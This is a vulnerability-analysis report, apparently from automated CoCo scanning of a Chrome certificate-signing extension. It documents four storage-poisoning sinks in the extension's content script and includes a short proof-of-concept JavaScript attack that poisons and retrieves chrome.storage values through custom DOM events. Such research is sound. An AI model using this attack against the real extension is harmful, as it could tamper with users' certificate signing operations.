# CoCo Analysis: chgajipdilbjolpgafadpdggjaeeapic

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4

---

## Sink 1: document_eventListener_certisigner-repoGenarateCsr-buffer → chrome_storage_local_set_sink (event.detail.repository)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/chgajipdilbjolpgafadpdggjaeeapic/opgen_generated_files/cs_0.js
Line 740		document.addEventListener('certisigner-repoGenarateCsr-buffer', function(event) {
Line 741			if (event.detail.repository){
	event.detail.repository
```

**Code:**

```javascript
// Content script (cs_0.js) - Entry point: attacker stores data
document.addEventListener('certisigner-repoGenarateCsr-buffer', function(event) {
  if (event.detail.repository){
    chrome.storage.local.set({'repository': event.detail.repository}); // ← attacker-controlled
    chrome.storage.local.set({'provider': event.detail.provider});     // ← attacker-controlled
    chrome.storage.local.set({'alias': event.detail.alias});           // ← attacker-controlled
    chrome.storage.local.set({'hash': event.detail.hash});             // ← attacker-controlled
  }
  repoGenarateCsr(event);
});

// Content script (cs_0.js) - Retrieval point: attacker retrieves data
document.addEventListener('certisigner-repoInstallCertificate-buffer', function(event) {
  chrome.storage.local.get('provider', function(result) {
    event.detail.provider = result.provider; // ← poisoned data retrieved
    chrome.storage.local.get('alias', function(result) {
      event.detail.alias = result.alias; // ← poisoned data retrieved
      chrome.storage.local.get('hash', function(result) {
        event.detail.hash = result.hash; // ← poisoned data retrieved
        chrome.storage.local.get('repository', function(result) {
          event.detail.repository = result.repository; // ← poisoned data retrieved
          repoInstallCertificate(event); // Sends poisoned data back
        });
      });
    });
  });
});

// Function that sends data back to attacker
function repoInstallCertificate(event) {
  chrome.runtime.sendMessage({
    requireCompleteChain: event.detail.requireCompleteChain,
    alias: event.detail.alias,                 // ← poisoned value
    provider: event.detail.provider,           // ← poisoned value
    repository: event.detail.repository,       // ← poisoned value
    hash: event.detail.hash,                   // ← poisoned value
    certificatePem: event.detail.certificatePem,
    action: "repoInstallCertificate"
  }, function(response) {
    returnMessage = createReturnMessage(response);
    sendEvent(event.type + '-return', returnMessage); // ← sends response back to webpage
  });
}

// Function that dispatches event back to webpage
function sendEvent(name, message){
  event = new CustomEvent(name, { detail: message, bubbles: false, cancelable: false});
  document.dispatchEvent(event); // ← attacker can listen for this event
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listeners (document.addEventListener)

**Attack:**

```javascript
// Malicious webpage on certisign.com.br or certintra.com.br

// Step 1: Poison storage with malicious values
const poisonEvent = new CustomEvent('certisigner-repoGenarateCsr-buffer', {
  detail: {
    repository: 'malicious_repo',
    provider: 'malicious_provider',
    alias: 'malicious_alias',
    hash: 'malicious_hash'
  }
});
document.dispatchEvent(poisonEvent);

// Step 2: Retrieve poisoned data by triggering the retrieval event
const retrieveEvent = new CustomEvent('certisigner-repoInstallCertificate-buffer', {
  detail: {
    requireCompleteChain: true,
    certificatePem: 'some_cert'
  }
});

// Listen for the response containing poisoned data
document.addEventListener('certisigner-repoInstallCertificate-buffer-return', function(event) {
  console.log('Poisoned data retrieved:', event.detail);
  // Attacker receives the response containing the poisoned storage values
});

document.dispatchEvent(retrieveEvent);
```

**Impact:** Complete storage exploitation chain. Attacker-controlled webpage on whitelisted domains (*.certisign.com.br/* or *.certintra.com.br/* per manifest) can poison extension storage with arbitrary values via custom DOM events, then trigger retrieval of those values which are sent back to the attacker's webpage via document.dispatchEvent. This allows the attacker to manipulate certificate signing operations, potentially causing the extension to use malicious certificate repositories, providers, aliases, or hash algorithms controlled by the attacker.

---

## Sink 2: document_eventListener_certisigner-repoGenarateCsr-buffer → chrome_storage_local_set_sink (event.detail.provider)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/chgajipdilbjolpgafadpdggjaeeapic/opgen_generated_files/cs_0.js
Line 740		document.addEventListener('certisigner-repoGenarateCsr-buffer', function(event) {
Line 741			if (event.detail.repository){
Line 743				chrome.storage.local.set({'provider': event.detail.provider});
	event.detail.provider
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listeners (document.addEventListener)

**Attack:** Same as Sink 1

**Impact:** Same as Sink 1 - part of the complete storage exploitation chain allowing manipulation of certificate provider values.

---

## Sink 3: document_eventListener_certisigner-repoGenarateCsr-buffer → chrome_storage_local_set_sink (event.detail.alias)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/chgajipdilbjolpgafadpdggjaeeapic/opgen_generated_files/cs_0.js
Line 740		document.addEventListener('certisigner-repoGenarateCsr-buffer', function(event) {
Line 741			if (event.detail.repository){
Line 744				chrome.storage.local.set({'alias': event.detail.alias});
	event.detail.alias
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listeners (document.addEventListener)

**Attack:** Same as Sink 1

**Impact:** Same as Sink 1 - part of the complete storage exploitation chain allowing manipulation of certificate alias values.

---

## Sink 4: document_eventListener_certisigner-repoGenarateCsr-buffer → chrome_storage_local_set_sink (event.detail.hash)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/chgajipdilbjolpgafadpdggjaeeapic/opgen_generated_files/cs_0.js
Line 740		document.addEventListener('certisigner-repoGenarateCsr-buffer', function(event) {
Line 741			if (event.detail.repository){
Line 745				chrome.storage.local.set({'hash': event.detail.hash});
	event.detail.hash
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listeners (document.addEventListener)

**Attack:** Same as Sink 1

**Impact:** Same as Sink 1 - part of the complete storage exploitation chain allowing manipulation of hash algorithm values used in certificate operations.
